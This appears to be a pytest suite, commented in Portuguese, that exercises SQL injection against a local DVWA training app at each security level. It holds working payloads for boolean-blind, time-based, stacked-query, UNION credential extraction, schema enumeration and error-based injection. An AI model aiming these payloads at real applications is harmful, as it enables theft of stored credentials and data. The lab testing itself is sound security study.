import pytest
import re
import requests
import time

# URL base da aplicação DVWA
BASE_URL = "http://localhost:8080"

# Níveis de segurança a serem testados
LEVELS = ["low", "medium", "high", "impossible"]

# --- Funções Auxiliares ---

def login_dvwa(base_url=BASE_URL, username="admin", password="password"):
    """Realiza o login no DVWA e retorna uma sessão autenticada."""
    session = requests.Session()
    login_page = session.get(f"{base_url}/login.php")
    token_search = re.search(r"name='user_token' value='(.*?)'", login_page.text)
    token = token_search.group(1) if token_search else None

    login_data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
    }
    response = session.post(f"{base_url}/login.php", data=login_data)
    if "Login failed" in response.text or "login.php" in response.url:
        raise Exception("Falha no login. Verifique usuário e senha.")
    return session

def set_security_level(session, level, base_url=BASE_URL):
    """Configura o nível de segurança do DVWA para a sessão atual."""
    response_get = session.get(f"{base_url}/security.php")
    token_search = re.search(r"name='user_token' value='(.*?)'", response_get.text)
    token = token_search.group(1) if token_search else None
    data = {
        "security": level,
        "seclev_submit": "Submit"
    }
    if token:
        data["user_token"] = token
    session.post(f"{base_url}/security.php", data=data)

def prepare_session(level):
    """Cria e prepara uma sessão (login + nível de segurança)."""
    session = login_dvwa()
    set_security_level(session, level)
    return session

def normalize_response(text):
    """Normaliza o texto de resposta para remover tokens CSRF dinâmicos."""
    return re.sub(r"(name='user_token' value=')[^']+(')", r"\1TOKEN_NORMALIZADO\2", text)

# --- Suíte de Testes de Injeção de SQL ---

@pytest.mark.parametrize("level", LEVELS)
def test_blind_boolean_sql_injection(level):
    print(f"\nIniciando teste Blind Boolean SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    
    # Adicionada lógica para o nível 'medium'
    if level == 'medium':
        payload_true = "1 AND 1=1 #"
        payload_false = "1 AND 1=2 #"
    else:
        payload_true = "1' AND 1=1 -- "
        payload_false = "1' AND 1=2 -- "

    resp_true = session.post(url, data={"id": payload_true, "Submit": "Submit"})
    resp_false = session.post(url, data={"id": payload_false, "Submit": "Submit"})

    resp_true_norm = normalize_response(resp_true.text)
    resp_false_norm = normalize_response(resp_false.text)

    vulneravel = resp_true_norm != resp_false_norm
    esperado = level in ["low", "medium"]
    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_piggybacked_sql_injection(level):
    print(f"\nIniciando teste Piggybacked SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    
    # Adicionada lógica para o nível 'medium'
    if level == 'medium':
        # Nota: Stacked queries geralmente não funcionam em mysql_query(), mas o teste é válido.
        payload = "1; SELECT SLEEP(1) #"
    else:
        payload = "1; SELECT SLEEP(1); -- "
    
    resp = session.post(url, data={"id": payload, "Submit": "Submit"})

    # A verificação para piggyback pode ser frágil, mas mantida para consistência.
    vulneravel = "First name" in resp.text
    esperado = level in ["low"] # Stacked queries normalmente só funcionam no nível low do DVWA
    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_time_based_sql_injection(level):
    print(f"\nIniciando teste Time-based SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    
    # Adicionada lógica para o nível 'medium'
    if level == 'medium':
        payload_true = "1 AND IF(1=1, SLEEP(5), 0) #"
        payload_false = "1 AND IF(1=2, SLEEP(5), 0) #"
    else:
        payload_true = "1' AND IF(1=1, SLEEP(5), 0) -- "
        payload_false = "1' AND IF(1=2, SLEEP(5), 0) -- "

    start_true = time.time()
    session.post(url, data={"id": payload_true, "Submit": "Submit"})
    end_true = time.time()

    start_false = time.time()
    session.post(url, data={"id": payload_false, "Submit": "Submit"})
    end_false = time.time()

    delay_true = end_true - start_true
    delay_false = end_false - start_false
    delta = delay_true - delay_false

    vulneravel = delta > 4
    esperado = level in ["low", "medium"]
    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_union_based_sql_injection(level):
    print(f"\nIniciando teste Union-Based (Extração de Dados) no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    
    # Adicionada lógica para o nível 'medium'
    if level == 'medium':
        payload = "1 UNION SELECT user, password FROM users #"
    else:
        payload = "1' UNION SELECT user, password FROM users -- "
    
    data = {"id": payload, "Submit": "Submit"}
    resp = session.post(url, data=data)

    vulneravel = "admin" in resp.text and "password" in resp.text
    esperado = level in ["low", "medium"]
    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_union_based_schema_enumeration(level):
    print(f"\nIniciando teste Union-Based (Schema Enumeration) no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    
    # Adicionada lógica para o nível 'medium'
    if level == 'medium':
        payload = "1 UNION SELECT NULL, table_name FROM information_schema.tables #"
    else:
        payload = "' UNION SELECT NULL, table_name FROM information_schema.tables -- "
    
    data = {"id": payload, "Submit": "Submit"}
    resp = session.post(url, data=data)

    vulneravel = "guestbook" in resp.text and "users" in resp.text
    esperado = level in ["low", "medium"]
    assert vulneravel == esperado

@pytest.mark.parametrize("level", LEVELS)
def test_error_based_sqli(level):
    print(f"\nIniciando teste Error-Based SQL Injection no nível {level}")
    session = prepare_session(level)
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    
    # Adicionada lógica para o nível 'medium'
    if level == 'medium':
        payload = "1 AND updatexml(1, concat(0x7e, database(), 0x7e), 1) #"
    else:
        payload = "1' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- "
    
    params = {"id": payload, "Submit": "Submit"}
    response = session.get(url, params=params)

    vulneravel = "XPATH syntax error: '~dvwa~'" in response.text
    esperado = level in ["low"] # A injeção por erro só é esperada no nível 'low'
    assert vulneravel == esperado